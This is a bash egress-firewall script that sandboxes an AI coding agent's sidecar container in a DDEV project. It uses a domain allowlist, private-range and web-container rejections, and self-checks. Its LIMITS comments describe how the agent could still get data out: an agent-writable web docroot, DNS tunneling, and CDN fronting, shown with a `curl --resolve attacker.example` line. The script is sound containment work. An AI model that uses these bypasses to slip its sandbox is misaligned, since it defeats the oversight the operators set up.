#!/bin/bash
#
# /bin/bash, not /usr/bin/env bash: env resolves the interpreter through the
# caller's PATH, before the PATH pinning below runs.
#
# init-firewall.sh: egress firewall for the ddev-claude sidecar, replacing the
# add-on's script. DDEV's generated-file marker is left out, so add-on updates
# leave this file alone and upstream fixes to it need a manual diff.
#
# Runs from:
#   - the container entrypoint. A non-zero exit means the container does not
#     start.
#   - the launcher, before every session, exec and shell. A non-zero exit
#     aborts the launch but leaves the running container in whatever state
#     this script reached, so every step is safe to re-run: one run at a time
#     (flock), idempotent set creation, and a dnsmasq restart that waits for
#     the old process.
#
# Every stop ends with a fix-it block from the kit's message file, printed by
# the root-owned helper at FIX_IT below.
#
# WHAT IT ENFORCES
#   - DROP policies for IPv4 and, where an IPv6 stack exists, IPv6, set first:
#     before the lock, the prerequisite checks and the flush. On a first run
#     the policies are Docker's default ACCEPT, so a failure before this point
#     would leave the container open. A flush does not reset a policy, so a
#     re-run stays closed throughout, and lookups that need DNS wait for the
#     loopback and DNS rules.
#   - The whole ruleset is installed before the address sets are rebuilt, and
#     new set contents go live with `ipset swap`. A rule naming a set is valid
#     whatever the set holds, so a re-run keeps the previous allowlist in
#     service until the new one replaces it, rather than cutting a running
#     session off for a resolution round.
#   - Only the filter table is flushed. Docker's DNAT rule in nat/DOCKER_OUTPUT
#     redirects 127.0.0.11:53 to its embedded DNS; flushing nat would stop
#     every internal hostname resolving.
#   - Egress to allowlisted domains is TCP 443 only, so an allowlisted address
#     cannot carry SSH or another protocol. dnsmasq adds each new address an
#     allowlisted domain resolves to, so CDN address changes are followed.
#   - The host bridge gateway, the host's address on this network, is rejected
#     apart from DNS and the MCP proxy port: a route to it reaches the DDEV
#     router (and through it every other project's site), host databases and
#     host SSH. Every non-public address is rejected ahead of the domain
#     allowlist, so no DNS answer for an allowed domain opens the host, the
#     LAN, another container or a cloud metadata service.
#   - DDEV services are allowed by address, never by subnet: only the
#     services named in services.list, on every protocol and port. ICMP echo
#     reaches no other address.
#   - DNS goes to the pinned resolvers only, on UDP and TCP, so port 53 is not a
#     channel to any other host. TCP stays open to them because dnsmasq falls
#     back to it for answers too large for UDP.
#   - IPv6 is denied, and a failure to deny it is fatal where an IPv6 stack
#     exists. A container with no IPv6 stack needs neither ip6tables nor the
#     check.
#   - The checks of the packet filter are fatal, and test the filter itself,
#     not the resolver.
#   - Inbound, only loopback, established traffic and the reachable services
#     are accepted; the sidecar serves nothing.
#   - The settings (allowed domains, reachable services) come from root-owned
#     files baked into the image. Not from the project tree, which the agent
#     can write before re-running this script through its one sudo
#     permission; not from the environment, which sudo's env_reset strips and
#     which the agent sets for anything it runs.
#
# LIMITS
#   - The web container has unfiltered internet access and serves a docroot the
#     agent can write, so a route to it would bypass the allowlist in both
#     directions: write a script that fetches and returns any URL, then request
#     it. Web's addresses are never allowed, and the verification below stops
#     the firewall if web is reachable. A file the agent writes still runs when
#     someone else requests it, a one-way channel that needs a trigger; closing
#     it means filtering web's own egress.
#   - DNS tunneling: port 53 to the pinned resolvers reaches anyone who runs an
#     authoritative nameserver.
#   - CDN fronting: the allowlist matches destination addresses, and several
#     allowed domains sit behind shared CDN edges. `curl --resolve
#     attacker.example:443:<edge-ip>` sends data to an accepted address, and SNI
#     routes it wherever the attacker fronted. Only an SNI-filtering forward
#     proxy closes this.
#
# Needs NET_ADMIN and NET_RAW, which the add-on's compose file grants, and
# root: the sidecar user's one sudo grant is for this path.

set -Eeuo pipefail
IFS=$'\n\t'

# Pinned rather than inherited. Every command below runs as root and is
# resolved by name, so a caller-controlled PATH would turn any of them into an
# execution primitive. sudo's secure_path, which the image build asserts,
# covers only runs started through sudo.
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export PATH
umask 022

FIX_IT=/usr/local/lib/agent-container-kit/fix-it.sh

# Plain text: the launcher drops progress lines and shows warnings, and quotes
# the container log with control characters as ?.
log()  { printf '[firewall] %s\n' "$*"; }
warn() { printf '[firewall] warning: %s\n' "$*" >&2; }

# Stops with the fix-it block for a message id, passing values as name=value.
# Control characters in a value print as ?, so a line read from a list cannot
# rewrite the terminal. If the helper fails, the id and values still print.
die() {
  local arg args=() IFS=' '
  for arg in "$@"; do args+=("${arg//[^[:print:]]/?}"); done
  "$FIX_IT" "${args[@]}" >&2 || printf '[firewall] stopped: %s\n' "${args[*]}" >&2
  exit 1
}

# A command that fails outside a condition stops the script here; set -E
# carries the trap into functions. Before every DROP policy is set, a failure
# means the container could not be closed; after, the policies hold whatever
# stopped the run. Only the main shell reports, since a failure in a subshell
# surfaces again in the command that started it.
POLICIES_SET=0
on_error() {
  local status=$? line=$1
  [[ $BASHPID == "$$" ]] || return "$status"
  if (( POLICIES_SET )); then
    die firewall-step-failed "line_no=$line" "command=${BASH_COMMAND:0:200}" "status=$status"
  fi
  die firewall-cannot-close "command=${BASH_COMMAND:0:200}" "status=$status"
}
trap 'on_error "$LINENO"' ERR

[[ $EUID -eq 0 ]] || die firewall-not-root
command -v iptables >/dev/null || die firewall-tool-missing tool=iptables

# Close before anything else (WHAT IT ENFORCES, above). On a re-run the
# policies are already DROP and this changes nothing.
log "closing before rebuild"
iptables -P INPUT   DROP
iptables -P FORWARD DROP
iptables -P OUTPUT  DROP

# ---------------------------------------------------------------------------
# IPv6. An unfiltered IPv6 stack bypasses every IPv4 rule, so failing to
# filter one that exists is fatal. A container with no IPv6 stack has nothing
# to filter and starts.
# ---------------------------------------------------------------------------
# Presence is determined by whether any interface holds an IPv6 address, not by
# the `all.disable_ipv6` sysctl. That sysctl reports the last value written to
# it, and an interface created afterwards inherits from `default`, so it can
# carry a live IPv6 address while `all` still reads 1.
#
# The file is read, not size-tested: it reports size 0 whatever it holds. The
# stderr redirect comes first so an absent file (no IPv6 in the kernel) is quiet.
IPV6_PRESENT=0
if read -r _ 2>/dev/null < /proc/net/if_inet6; then
  IPV6_PRESENT=1
fi

if (( IPV6_PRESENT )); then
  command -v ip6tables >/dev/null || die firewall-tool-missing tool=ip6tables
  ip6tables -P INPUT   DROP || die firewall-ipv6-failed "step=set its INPUT policy to DROP"
  ip6tables -P FORWARD DROP || die firewall-ipv6-failed "step=set its FORWARD policy to DROP"
  ip6tables -P OUTPUT  DROP || die firewall-ipv6-failed "step=set its OUTPUT policy to DROP"
fi
POLICIES_SET=1

# ---------------------------------------------------------------------------
# One run at a time. The entrypoint and the launcher can both run this, and two
# overlapping runs would rebuild the address sets underneath each other. The
# lock waits rather than failing at once, since the usual collision is a
# session starting while the entrypoint run finishes.
# ---------------------------------------------------------------------------
# Every program this script runs by name, checked before the lock so a missing
# flock is not reported as a busy lock. iptables is checked above and ip6tables
# in the IPv6 block, since only a container with IPv6 needs it.
for tool in ipset dig dnsmasq curl flock stat timeout awk ip grep getent sort head seq cat sleep mkdir rm bash; do
  command -v "$tool" >/dev/null || die firewall-tool-missing "tool=$tool"
done

exec 9>/run/init-firewall.lock
flock -w 60 9 || die firewall-lock-busy

# ---------------------------------------------------------------------------
# Settings, from the root-owned files the image build writes (WHAT IT
# ENFORCES, above). Changing either list needs an image rebuild. Both are read
# before any rule changes, so a bad list stops a re-run with the running rules
# untouched.
# ---------------------------------------------------------------------------
DOMAINS_FILE="/etc/agent-container-kit/firewall/egress-domains.list"
SERVICES_FILE="/etc/agent-container-kit/firewall/services.list"

# Rejects a settings file the image build did not leave root-owned and
# unwritable by others.
check_config_file() { # path
  local owner mode
  [[ ! -L "$1" ]] || die firewall-config-untrusted "file=$1" "problem=is a symlink"
  [[ -f "$1" ]] || die firewall-config-untrusted "file=$1" "problem=is missing or not a regular file"
  # IFS is \n\t for this script, so a plain read would not split on the space
  # between the two fields and would put the whole line in owner.
  IFS=' ' read -r owner mode < <(stat -c '%U %a' "$1")
  [[ "$owner" == "root" ]] || die firewall-config-untrusted "file=$1" "problem=is owned by $owner, not root"
  (( (8#$mode & 0022) == 0 )) || die firewall-config-untrusted "file=$1" "problem=is group- or world-writable (mode $mode)"
}

# The image build copies the project's .ddev/claude/egress-domains.list, which
# records why each entry is there. One domain per line; `#` starts a comment.
# Each entry is passed to dig and written into dnsmasq's configuration, so a
# line that is not a single domain name is rejected, as is a carriage return,
# which a list saved with Windows line endings carries on every line.
read_domains() { # path -> ALL_DOMAINS
  local line entry domain rest line_no=0
  ALL_DOMAINS=()
  while IFS= read -r line || [[ -n "$line" ]]; do
    line_no=$((line_no + 1))
    [[ "$line" != *$'\r'* ]] || die firewall-domains-crlf "line_no=$line_no"
    entry="${line%%#*}"
    IFS=$' \t' read -r domain rest <<< "$entry"
    [[ -n "$domain" ]] || continue
    [[ -z "$rest" && "$domain" =~ ^[A-Za-z0-9]([A-Za-z0-9.-]*[A-Za-z0-9])?$ ]] \
      || die firewall-domain-invalid "line_no=$line_no" "line=$line"
    ALL_DOMAINS+=("$domain")
  done < "$1"
  (( ${#ALL_DOMAINS[@]} > 0 )) || die firewall-domains-empty
}

# The image build writes the CLAUDE_SIDECAR_SERVICES build argument here: DDEV
# service names separated by spaces. Each one becomes addresses the sidecar can
# reach on every port, so the list is read as strictly as the domains: a word
# that is not a service name, or web, stops the firewall. An empty list means
# the sidecar reaches no DDEV service, since not every project has a database.
read_services() { # path -> SERVICES
  local line svc words
  SERVICES=()
  while IFS= read -r line || [[ -n "$line" ]]; do
    IFS=$' \t' read -ra words <<< "$line"
    for svc in "${words[@]}"; do
      [[ "$svc" =~ ^[A-Za-z0-9][A-Za-z0-9_.-]*$ ]] || die firewall-service-invalid "entry=$svc"
      [[ "$svc" != "web" ]] || die firewall-web-listed
      SERVICES+=("$svc")
    done
  done < "$1"
}

check_config_file "$DOMAINS_FILE"
read_domains "$DOMAINS_FILE"
log "allowlisted domains: $(IFS=,; echo "${ALL_DOMAINS[*]}")"

check_config_file "$SERVICES_FILE"
read_services "$SERVICES_FILE"

# The add-on's builder writes the domains from its own settings and extras to a
# file in the project tree, which this script never reads; the warning says
# where domains go instead.
if [[ -s /var/www/html/.ddev/claude/extra-domains.list ]]; then
  warn "ignoring .ddev/claude/extra-domains.list: that path is agent-writable. Add domains to .ddev/claude/egress-domains.list and rebuild the image."
fi

# ---------------------------------------------------------------------------
# Local topology, detected before any rule is written so the bootstrap DNS
# rules can be pinned to real destinations.
# ---------------------------------------------------------------------------
HOST_GATEWAY="$(ip route | awk '/default/ {print $3; exit}')"
[[ -n "$HOST_GATEWAY" ]] || die firewall-no-gateway
log "host gateway: $HOST_GATEWAY"

# Rebuild from empty. Only the filter table; see the header note on Docker's
# nat DNAT rule. The policies are already DROP, so the container stays closed.
iptables -F
iptables -X

# ---------------------------------------------------------------------------
# The whole ruleset, installed in one ordered pass before the address sets are
# rebuilt. The sets keep their previous contents while the lookups run and are
# swapped in at the end, so a session already running in another terminal
# keeps its egress while `ddev claude` re-runs this script.
#
# The order matters. The narrow gateway allowances precede the gateway REJECT,
# which precedes the services accept. The services accept precedes the
# non-public REJECT, which precedes the domain allowlist accept, so the
# allowlist only ever opens public addresses.
# ---------------------------------------------------------------------------
log "installing rules"

# The live address sets exist before any rule names them, since iptables
# rejects a --match-set naming a missing set. Created without flushing, so a
# re-run keeps the previous contents in service until the swap further down.
ipset create -exist allowed-ipv4 hash:ip  family inet maxelem 65536 timeout 3600
ipset create -exist allowed-net  hash:net family inet maxelem 1024

# Every IPv4 range that is not public internet: this network, private, shared
# (carrier-grade NAT), loopback, link-local, protocol assignments,
# documentation, benchmarking, multicast and reserved. The contents never
# change, so a re-run adds each range again with -exist and never empties it.
ipset create -exist non-public-ipv4 hash:net family inet
for net in 0.0.0.0/8 10.0.0.0/8 100.64.0.0/10 127.0.0.0/8 169.254.0.0/16 \
           172.16.0.0/12 192.0.0.0/24 192.0.2.0/24 192.168.0.0/16 198.18.0.0/15 \
           198.51.100.0/24 203.0.113.0/24 224.0.0.0/3; do
  ipset add -exist non-public-ipv4 "$net"
done

iptables -A INPUT  -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -A INPUT  -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# DNS to the resolvers in use and no others, on UDP and TCP (WHAT IT ENFORCES,
# above). Docker's embedded resolver at 127.0.0.11 needs no rule: that traffic
# goes out lo, accepted above.
for resolver in "$HOST_GATEWAY" 1.1.1.1 8.8.8.8; do
  iptables -A OUTPUT -p udp --dport 53 -d "$resolver" -j ACCEPT
  iptables -A OUTPUT -p tcp --dport 53 -d "$resolver" -j ACCEPT
done

# Resolved here rather than with the gateway above: the lookup needs the
# loopback and DNS rules, and on a fresh start nothing passes the DROP policies
# before them. ahostsv4, not ahosts: the latter can return an IPv6 address
# first, and `iptables -d <v6>` fails, which under set -e would abort the script
# with the ruleset half-installed.
HDINT_IP=$(getent ahostsv4 host.docker.internal 2>/dev/null | awk '/STREAM/ {print $1; exit}' || true)
if [[ -n "$HDINT_IP" ]] && [[ ! "$HDINT_IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
  warn "host.docker.internal resolved to a non-IPv4 address ($HDINT_IP); ignoring"
  HDINT_IP=""
fi

# The MCP proxy on the host. On Docker Desktop host.docker.internal is a
# host-gateway address outside the bridge subnet; on Linux it is commonly the
# bridge gateway itself, which is why this rule precedes the gateway REJECT.
if [[ -n "$HDINT_IP" ]]; then
  log "host.docker.internal: $HDINT_IP"
  iptables -A OUTPUT -d "$HDINT_IP" -p tcp --dport 8788 -j ACCEPT
else
  warn "host.docker.internal did not resolve; MCP proxy will be unreachable"
fi

# Everything else to the bridge gateway, the host's address on this network, is
# rejected, ahead of the services accept so that no service address opens it.
# The host's other addresses, such as host.docker.internal on Docker Desktop,
# are rejected by the non-public REJECT below.
iptables -A OUTPUT -d "$HOST_GATEWAY" -j REJECT --reject-with icmp-admin-prohibited

# The DDEV service addresses resolved below, on every port, since drush needs
# the database on its own port and add-on services use others. The set holds
# individual hosts, not a subnet; the rest of the local range, web included,
# meets the non-public REJECT below.
iptables -A OUTPUT -m set --match-set allowed-net dst -j ACCEPT
iptables -A INPUT  -m set --match-set allowed-net src -j ACCEPT

# Addresses outside the public internet are rejected before the domain
# allowlist. Both routes that fill allowed-ipv4, this script's lookups (which
# on a first run go straight to Docker's resolver) and dnsmasq's ipset entries,
# add whatever address a DNS answer holds, so without this an allowed domain
# answering with a private address would open it on 443: the host on Docker
# Desktop, the DDEV router, other projects' containers, the LAN, or a cloud
# metadata service. A network whose DNS answers an allowed domain with a
# private address, such as a local proxy's, cannot reach that domain.
iptables -A OUTPUT -m set --match-set non-public-ipv4 dst -j REJECT --reject-with icmp-admin-prohibited

# Allowlisted public destinations, TCP 443 only.
iptables -A OUTPUT -p tcp --dport 443 -m set --match-set allowed-ipv4 dst -j ACCEPT

# Reject rather than drop on the way out, so blocked calls fail fast with a
# clear error instead of hanging until timeout.
iptables -A OUTPUT -j REJECT --reject-with icmp-admin-prohibited

# IPv6 rules. The DROP policies set at the top survive the flush.
if (( IPV6_PRESENT )); then
  log "denying IPv6"
  ip6tables -F              || die firewall-ipv6-failed "step=flush its IPv6 rules"
  ip6tables -A INPUT  -i lo -j ACCEPT || die firewall-ipv6-failed "step=add its IPv6 loopback rules"
  ip6tables -A OUTPUT -o lo -j ACCEPT || die firewall-ipv6-failed "step=add its IPv6 loopback rules"
  # Reject rather than rely on the DROP policy, so a blocked IPv6 attempt fails
  # at once instead of hanging until timeout.
  ip6tables -A OUTPUT -j REJECT --reject-with icmp6-adm-prohibited \
    || die firewall-ipv6-failed "step=add its IPv6 REJECT rule"
else
  log "no IPv6 addresses on any interface; nothing to filter"
fi

# ---------------------------------------------------------------------------
# Address sets. New contents go into shadow sets, put live with `ipset swap`,
# which is atomic, so the rules above never see an empty set. The live sets
# were created above and are not touched here.
#
# `timeout 3600` lets address entries expire; an entry refreshes each time it
# is used, so only addresses that have gone quiet expire. dnsmasq adds an
# address each time an allowlisted domain resolves to a new one, and without
# expiry the set would fill to maxelem, after which adds fail silently and new
# CDN addresses never reach the set.
# ---------------------------------------------------------------------------
ipset create -exist allowed-ipv4-new hash:ip  family inet maxelem 65536 timeout 3600
ipset create -exist allowed-net-new  hash:net family inet maxelem 1024
ipset flush allowed-ipv4-new
ipset flush allowed-net-new

resolve_and_add() {
  local domain="$1" ips ip attempt
  for attempt in 1 2; do
    # dig exits non-zero on a transient no-reply; without the guard, set -e
    # kills the script mid-loop and leaves a half-built firewall behind DROP.
    ips=$(dig +short +time=3 +tries=2 A "$domain" 2>/dev/null \
          | grep -E '^([0-9]{1,3}\.){3}[0-9]{1,3}$' || true)
    [[ -n "$ips" ]] && break
    [[ "$attempt" == 1 ]] && sleep 1
  done
  if [[ -z "$ips" ]]; then
    warn "no A records for $domain (dnsmasq will populate it on first use)"
    return
  fi
  while IFS= read -r ip; do
    if ! ipset add allowed-ipv4-new "$ip" 2>/dev/null; then
      # Already present is the normal case when two allowlisted domains share an
      # address, which several Anthropic hosts do. Only warn if it is genuinely
      # absent afterwards, which means the add actually failed.
      ipset test allowed-ipv4-new "$ip" 2>/dev/null \
        || warn "could not add address for $domain: $ip"
    fi
  done <<< "$ips"
}

log "resolving allowlist"
for d in "${ALL_DOMAINS[@]}"; do resolve_and_add "$d"; done

# An empty allowlist blocks everything, the Anthropic API included. Checked on
# the shadow set before it goes live, so a failed resolution round leaves the
# previous allowlist in place.
RESOLVED_COUNT=$(ipset save allowed-ipv4-new | grep -c '^add ' || true)
[[ "$RESOLVED_COUNT" -gt 0 ]] || die firewall-allowlist-unresolved
log "allowlist holds $RESOLVED_COUNT addresses"

# ---------------------------------------------------------------------------
# Reachable DDEV services, by address rather than by subnet. DDEV attaches
# every service to the project network and its global network whatever the
# compose file says, so allowing the attached subnets would allow web.
#
# Addresses are resolved on every run, at container start and at every
# launch, so a service that comes back on a different address is picked up at
# the next launch. Each listed service is a host the agent can reach on any
# port.
# ---------------------------------------------------------------------------
if (( ${#SERVICES[@]} )); then
  log "resolving reachable services: $(IFS=' '; echo "${SERVICES[*]}")"
  _svc_found=0
  for svc in "${SERVICES[@]}"; do
    svc_ips=$(getent ahostsv4 "$svc" 2>/dev/null | awk '{print $1}' | sort -u || true)
    if [[ -z "$svc_ips" ]]; then
      warn "$svc did not resolve; the sidecar will not be able to reach it"
      continue
    fi
    while IFS= read -r ip; do
      [[ -z "$ip" ]] && continue
      log "  $svc: $ip"
      ipset add allowed-net-new "$ip" 2>/dev/null || true
      _svc_found=1
    done <<< "$svc_ips"
  done
  [[ "$_svc_found" -eq 1 ]] || warn "no DDEV services resolved; drush and the test suites will not work"
else
  log "no reachable services listed; the sidecar reaches no DDEV service"
fi

# Put both new sets live, then discard the old contents. `ipset swap` exchanges
# the contents behind the names, so the rules switch over in one step.
# Addresses dnsmasq added to the live set during this run are discarded and
# come back at their next lookup.
ipset swap allowed-ipv4-new allowed-ipv4
ipset swap allowed-net-new  allowed-net
ipset destroy allowed-ipv4-new
ipset destroy allowed-net-new

# ---------------------------------------------------------------------------
# dnsmasq: binds each allowlisted domain to the ipset, so later lookups extend
# the allowlist as CDN addresses change. Docker's embedded resolver comes
# first, so DDEV service names keep resolving.
#
# The old dnsmasq is stopped by pid file and the shell's kill builtin, since
# the base image has no procps and so no pkill; a dnsmasq left running would
# hold port 53 and fail the new one's start.
# ---------------------------------------------------------------------------
DNSMASQ_CONF="/etc/dnsmasq.d/claude-firewall.conf"
DNSMASQ_PID="/run/claude-dnsmasq.pid"
mkdir -p /etc/dnsmasq.d
{
  echo "# Generated by init-firewall.sh"
  echo "listen-address=127.0.0.1"
  echo "bind-interfaces"
  echo "no-resolv"
  echo "pid-file=${DNSMASQ_PID}"
  # Each reachable service name goes to Docker's embedded resolver by
  # `server=/name/ip`. With only a flat server list, dnsmasq can send a
  # single-label name to a public resolver and return its NXDOMAIN. The
  # services reader already rejects web; the skip keeps this loop correct on
  # its own.
  for svc in "${SERVICES[@]}"; do
    [[ "$svc" == "web" ]] && continue
    echo "server=/${svc}/127.0.0.11"
  done
  # Everything else: Docker's resolver first, then the public resolvers.
  echo "strict-order"
  echo "server=127.0.0.11"
  echo "server=1.1.1.1"
  echo "server=8.8.8.8"
  #
  # stop-dns-rebind is not set: it rejects private addresses in answers, which
  # is what Docker's resolver returns for db. A private address in an answer
  # for an allowed domain enters allowed-ipv4 and opens nothing, since the
  # non-public REJECT precedes the allowlist accept.
  for d in "${ALL_DOMAINS[@]}"; do
    echo "ipset=/${d}/allowed-ipv4"
  done
  # Address pins for every reachable service, skipping web as above. An
  # `address=` entry is answered by dnsmasq without forwarding, so a service
  # that comes back on a different address resolves wrongly until the next
  # firewall run, at the next launch.
  for svc in "${SERVICES[@]}"; do
    [[ "$svc" == "web" ]] && continue
    svc_ip=$(dig @127.0.0.11 +short +time=2 +tries=1 A "$svc" 2>/dev/null | grep -E '^([0-9]{1,3}\.){3}[0-9]{1,3}$' | head -1 || true)
    if [[ -n "$svc_ip" ]]; then
      echo "address=/${svc}/${svc_ip}"
    fi
  done
} > "$DNSMASQ_CONF"

if [[ -f "$DNSMASQ_PID" ]]; then
  old_pid="$(cat "$DNSMASQ_PID" 2>/dev/null || true)"
  # Checks the process is dnsmasq, not only that it lives. /run is an ordinary
  # image folder, so this pid file survives `docker restart`, which renumbers
  # pids from 1, and the number may now belong to an unrelated process, this
  # script's own subshells or the entrypoint included.
  if [[ -n "$old_pid" ]] \
     && [[ "$(cat "/proc/${old_pid}/comm" 2>/dev/null || true)" == "dnsmasq" ]] \
     && kill -0 "$old_pid" 2>/dev/null; then
    log "stopping previous dnsmasq (pid $old_pid)"
    kill "$old_pid" 2>/dev/null || true
    for _ in $(seq 1 25); do
      kill -0 "$old_pid" 2>/dev/null || break
      sleep 0.2
    done
    kill -0 "$old_pid" 2>/dev/null && die firewall-dns-helper-failed "problem=from the previous run (pid $old_pid) did not exit, so it still holds port 53"
  fi
  rm -f "$DNSMASQ_PID"
fi

# 9>&- keeps the lock's file descriptor out of the daemon. A daemon holding
# the lock would make every later run wait out the flock timeout and stop,
# until the container is recreated.
dnsmasq --conf-file="$DNSMASQ_CONF" 9>&- || die firewall-dns-helper-failed "problem=did not start"
{
  echo "nameserver 127.0.0.1"
  echo "nameserver 127.0.0.11"
} > /etc/resolv.conf
log "dnsmasq running"

# ---------------------------------------------------------------------------
# Verification. The checks of the filter are fatal, since this script gates
# container start; the reachability checks of the API and the database warn.
# ---------------------------------------------------------------------------
log "verifying"

# A raw TCP connect to a fixed address tests the packet filter alone. A probe
# that resolved a name would pass whenever DNS failed, and a curl probe fails
# TLS verification at an address the name does not belong to even when the
# connection succeeds. 1.1.1.1 is a DNS resolver, allowed on port 53 only, so
# the final REJECT rejects TCP 443 to it.
if timeout 5 bash -c 'exec 3<>/dev/tcp/1.1.1.1/443' 2>/dev/null; then
  die firewall-verify-failed "check=a connection to a non-allowlisted address on port 443 succeeded, so egress is not contained"
fi
log "  PASS: non-allowlisted address rejected on 443"

# An allowlisted address is rejected on any port but 443. The probe takes a
# public address, since the non-public REJECT rejects a private one on every
# port and would pass the check for the wrong reason.
_probe_ip=""
while IFS= read -r ip; do
  if ! ipset test non-public-ipv4 "$ip" >/dev/null 2>&1; then
    _probe_ip=$ip
    break
  fi
done < <(ipset save allowed-ipv4 | awk '/^add /{print $3}' || true)
if [[ -n "$_probe_ip" ]]; then
  if timeout 5 bash -c "exec 3<>/dev/tcp/${_probe_ip}/22" 2>/dev/null; then
    die firewall-verify-failed "check=allowlisted address $_probe_ip answered on port 22, so egress is not 443-only"
  fi
  log "  PASS: allowlisted address rejected on a non-443 port"
fi

# A warning, not a stop: the sidecar starts during an Anthropic outage or
# offline, and an allowlist that resolved to nothing has already stopped the
# run above. --max-time as well as --connect-timeout, which bounds only the TCP
# connect, so a stalled TLS handshake cannot hang the entrypoint.
if ! curl --connect-timeout 5 --max-time 10 --silent --output /dev/null https://api.anthropic.com 2>/dev/null; then
  warn "Anthropic API not reachable; check the network, the allowlist and dnsmasq. The firewall rejects private addresses, so a network whose DNS answers with one, such as a local proxy's, cannot reach it"
else
  log "  PASS: Anthropic API reachable"
fi

if [[ "$(iptables -S OUTPUT | head -1)" != "-P OUTPUT DROP" ]]; then
  die firewall-verify-failed "check=the IPv4 OUTPUT policy is not DROP"
fi
log "  PASS: IPv4 OUTPUT policy is DROP"

if (( IPV6_PRESENT )); then
  if [[ "$(ip6tables -S OUTPUT | head -1)" != "-P OUTPUT DROP" ]]; then
    die firewall-verify-failed "check=the IPv6 OUTPUT policy is not DROP"
  fi
  log "  PASS: IPv6 OUTPUT policy is DROP"
fi

# A listed database should be reachable for drush and the test suites. A
# warning, since the database may be starting or stopped. An unlisted db is
# not checked. DDEV's database listens on its engine's default port: 3306 for
# MySQL and MariaDB, 5432 for PostgreSQL.
_db_listed=0
for svc in "${SERVICES[@]}"; do
  if [[ "$svc" == "db" ]]; then _db_listed=1; fi
done
if (( _db_listed )); then
  if getent hosts db >/dev/null 2>&1; then
    _db_port=""
    for port in 3306 5432; do
      if timeout 3 bash -c "exec 3<>/dev/tcp/db/$port" 2>/dev/null; then
        _db_port=$port
        break
      fi
    done
    if [[ -n "$_db_port" ]]; then
      log "  PASS: database reachable on port $_db_port"
    else
      warn "database not reachable on port 3306 or 5432; check the claude-isolated network and allowed-net"
    fi
  else
    warn "db did not resolve; check that .ddev/docker-compose.zz-claude-db.yaml is installed, which puts db on the claude-isolated network"
  fi
fi

# The web container is unreachable (LIMITS, above). DDEV puts the sidecar on
# a network with web, so this is checked against the filter, two ways, both
# fatal. No address web resolves to is allowed: in allowed-net it would be
# open on every port, and in allowed-ipv4 on 443 unless the non-public REJECT
# rejects it first. And a connection to web on 80 or 443 fails, which catches
# a rule that allows it some other way. A web that does not resolve cannot be
# checked, so that stops the firewall too; the add-on's compose file starts
# web before the sidecar.
_web_ips=$(getent ahostsv4 web 2>/dev/null | awk '{print $1}' | sort -u) || _web_ips=""
[[ -n "$_web_ips" ]] || die firewall-web-unresolved
while IFS= read -r ip; do
  if ipset test allowed-net "$ip" >/dev/null 2>&1; then
    die firewall-web-reachable "how=its address $ip is in the firewall's allowed-net address set"
  fi
  if ipset test allowed-ipv4 "$ip" >/dev/null 2>&1 && ! ipset test non-public-ipv4 "$ip" >/dev/null 2>&1; then
    die firewall-web-reachable "how=its address $ip is public and in the firewall's allowed-ipv4 address set"
  fi
done <<< "$_web_ips"
log "  PASS: no address of web is allowed"
for port in 80 443; do
  if timeout 3 bash -c "exec 3<>/dev/tcp/web/$port" 2>/dev/null; then
    die firewall-web-reachable "how=a connection to web on port $port succeeded"
  fi
done
log "  PASS: web rejected on ports 80 and 443"

log "firewall active"
